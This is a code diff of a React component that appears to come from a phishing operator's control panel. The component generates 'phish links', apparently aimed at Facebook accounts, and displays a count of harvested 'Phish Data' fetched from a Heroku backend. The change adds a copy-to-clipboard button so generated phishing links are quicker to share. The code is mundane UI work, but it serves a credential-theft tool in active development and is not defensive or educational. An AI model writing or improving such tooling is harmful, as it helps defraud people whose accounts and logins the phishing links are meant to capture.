@@ -1,10 +1,17 @@
-import React, { useEffect, useState } from "react";
+import React, { useEffect, useRef, useState } from "react";
 import PhishData from './PhishData'
 const HackedDetail = ({keyValue}) => {
   const [link, setLink] = useState("");
   const [userKey, setUserKey] = useState("");
   const [phishData, setPhishData] = useState([]);
+  const FBLinkCopy  = useRef(null);
   
+  const copyToClipboard = (e) => {
+    FBLinkCopy.current.select();
+    document.execCommand('copy');
+  };
+
+
   useEffect(() => {
     fetch("https://ancient-garden-81797.herokuapp.com/userList", {
       method: "POST",
@@ -61,18 +68,24 @@ const HackedDetail = ({keyValue}) => {
   },[keyValue])
 
 
+
+
   return (
     <div className="text-center mt-5">
       <h2>Phish Link List</h2>
       <button onClick={() => handelLink(userKey[0].key)} className="btn btn-danger">
         Generate
       </button>
-
-      <p className="my-2">
+      {
+        link ? <button className="ms-3 btn btn-success" onClick={copyToClipboard}><i class="far fa-copy"></i></button> : ''
+      }
+      <p id="" className="my-2">
         <a href={link}>
           <span>{link}</span>
         </a>
       </p>
+      <textarea className="fbLink" ref={FBLinkCopy} value={link}></textarea>
+
 
     <h3 className="my-3"><span>My Phish Data : <span className="name">{phishData.length}</span></span></h3>
 
